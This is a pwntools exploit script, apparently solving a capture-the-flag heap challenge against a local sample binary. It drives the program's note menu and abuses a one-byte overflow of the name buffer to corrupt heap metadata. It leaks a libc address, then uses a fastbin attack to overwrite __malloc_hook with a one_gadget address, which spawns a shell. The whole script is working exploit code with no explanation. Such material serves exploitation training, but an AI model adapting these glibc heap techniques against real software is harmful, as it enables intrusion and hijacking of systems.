from pwn import *
from pwncli import one_gadget

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/sample15')
elf = ELF('./data/sample15')
libc = elf.libc
choice_words = '6.exit\n'
menu_add = 1
add_index_words = ''
add_size_words = 'Input the size\n'
add_content_words = ''
menu_del = 2
del_index_words = ''
menu_show = 3
show_index_words = ''
menu_edit = 5
edit_index_words = ''
edit_size_words = ''
edit_content_words = 'Input the note\n'
one_gadget = 0x4527a

def add(index=-1, size=-1, content=''):
    p.sendlineafter(choice_words, str(menu_add))
    if add_index_words:
        p.sendlineafter(add_index_words, str(index))
    if add_size_words:
        p.sendlineafter(add_size_words, str(size))
    if add_content_words:
        p.sendafter(add_content_words, content)

def delete(index=-1):
    p.sendlineafter(choice_words, str(menu_del))
    if del_index_words:
        p.sendlineafter(del_index_words, str(index))

def show(index=-1):
    p.sendlineafter(choice_words, str(menu_show))
    if show_index_words:
        p.sendlineafter(show_index_words, str(index))

def edit(index=-1, size=-1, content=''):
    p.sendlineafter(choice_words, str(menu_edit))
    if edit_index_words:
        p.sendlineafter(edit_index_words, str(index))
    if edit_size_words:
        p.sendlineafter(edit_size_words, str(size))
    if edit_content_words:
        p.sendafter(edit_content_words, content)

def update(content):
    p.sendlineafter(choice_words, '4')
    p.sendafter('input your name\n', content)

p.recv();payload = b'a'*0x30;p.send(payload)#step.1
add(size=0x80);add(size=0x10)#step.2
update(content=b'a'*0x30 + p8(0x10))#step.3
delete()#step.4
add(size=0x10);update(content=b'a'*0x30 + p8(0x30))#step.5
show();libc_leak = u64(p.recv(6).ljust(8, b'\x00'));libc.address = libc_leak - (0x3c4b20 + 0x58)#step.6
add(size=0x60)#step.7
add(size=0x40);add(size=0x60);delete()#step.8
add(size=0x10)#step.9
update(content=b'a'*0x30 + p8(0x10))#step.10
edit(content=p64(libc.sym['__malloc_hook'] - 0x23))#step.11
add(size=0x60);add(size=0x60)#step.12
edit(content=b'a'*(0x13 - 0x8) + p64(libc.address + one_gadget) + p64(libc.sym['realloc'] + 12))#step.13
add(size=0x50)#step.14
p.interactive()